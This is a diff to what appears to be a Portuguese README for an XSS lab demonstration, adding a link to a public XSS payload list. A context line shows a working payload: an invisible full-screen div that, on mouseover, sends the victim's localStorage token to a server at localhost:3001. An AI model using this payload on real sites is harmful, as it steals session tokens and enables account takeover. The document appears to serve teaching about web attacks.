@@ -22,3 +22,6 @@ Exemplo de funmcionamento do ataque XSS
  
 # Request HTTP
 `<div onmouseover="axios.post('http://localhost:3001/', {}, {headers:{Authorization:localStorage['token']} }).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`
+
+# Outros exeplos de como fazer esse ataque
+[XSS Payload List](https://github.com/payloadbox/xss-payload-list)
